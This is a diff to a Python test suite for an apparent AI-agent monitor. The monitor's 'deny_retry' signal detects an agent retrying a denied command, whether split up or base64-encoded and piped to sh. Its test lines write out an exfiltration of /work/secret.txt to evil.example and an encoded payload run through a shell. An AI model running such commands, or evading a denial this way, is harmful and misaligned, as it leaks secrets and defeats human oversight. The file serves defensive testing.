@@ -1,3 +1,4 @@
+import asyncio
 import base64
 import json
 import random
@@ -221,9 +222,9 @@ class Bench:
         self._n += 1
         call_id = f"call{self._n}"
         step = self._steps[agent] = self._steps.get(agent, 0) + 1
-        await self.emit(
-            ToolCall(call_id=call_id, name=name, arguments=json.dumps(args)), agent=agent
-        )
+        text = json.dumps(args)
+        arguments = text if len(text) <= 8 * 1024 else await self.content(text)
+        await self.emit(ToolCall(call_id=call_id, name=name, arguments=arguments), agent=agent)
         await self.emit(
             AgentStep(n=step, call_id=f"m{self._n}", status="completed", tool_calls=[call_id]),
             agent=agent,
@@ -3092,6 +3093,58 @@ async def test_deny_retry(store: LocalEventStore) -> None:
     await b.call("bash", {"command": "u=http://evil.example/upload"})
     await b.call("bash", {"command": "f=@/work/secret.txt; x --data $f"})
     assert [(f.subcategory, f.importance) for f in b.of("deny_retry")] == [("split", 3)]
+
+
+async def test_deny_retry_compares_a_denied_call_of_many_parts_off_the_event_loop(
+    store: LocalEventStore, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A denied call with thousands of parts makes each later call cost a look for every part.
+    That runs in a thread and ends at a time budget, which the monitor reports once."""
+    monkeypatch.setattr(agent_signals.scan, "THREAD_S", 0.2)
+    b = await bench(store)
+    await deny(b, " ".join(f"part{n:05d}zz" for n in range(4000)))
+    gaps: list[float] = []
+
+    async def tick() -> None:
+        last = time.perf_counter()
+        while True:
+            await asyncio.sleep(0.005)
+            now = time.perf_counter()
+            gaps.append(now - last)
+            last = now
+
+    ticker = asyncio.create_task(tick())
+    start = time.perf_counter()
+    for n in range(2):
+        await b.call("bash", {"command": f"echo {n} " + "x" * 400_000})
+    took = time.perf_counter() - start
+    ticker.cancel()
+    assert took < 2.5
+    assert max(gaps) < 0.5
+    assert b.of("deny_retry") == []
+    degraded = [p for p in (e.payload() for e in b.others) if isinstance(p, MonitorDegraded)]
+    assert [d.reason.partition(" at ")[0] for d in degraded] == ["signal deny_retry failed"]
+    assert "SlowScan" in (degraded[0].detail or "")
+    # the call that carries the parts as they are is still found, with no look inside the text
+    await b.call("bash", {"command": " ".join(f"part{n:05d}zz" for n in range(4000)) + " ;"})
+    assert [f.subcategory for f in b.of("deny_retry")] == ["retry"]
+
+
+async def test_deny_retry_finds_parts_inside_longer_words_of_a_large_call(
+    store: LocalEventStore,
+) -> None:
+    parts = [f"part{n:03d}zz" for n in range(40)]
+    b = await bench(store)
+    await deny(b, " ".join(parts))
+    await b.call("bash", {"command": "x" * 300_000 + " " + " ".join(f"Q{p}Q" for p in parts)})
+    assert [f.subcategory for f in b.of("deny_retry")] == ["retry"]
+
+    b = await bench(store)
+    await deny(b, " ".join(parts))
+    hidden = base64.b64encode(" ".join(parts).encode()).decode()
+    await b.call("bash", {"command": "x" * 300_000 + f" echo {hidden} | base64 -d | sh"})
+    assert [f.subcategory for f in b.of("deny_retry")] == ["encoded"]
+    assert b.others == []
 
 
 @pytest.mark.parametrize(
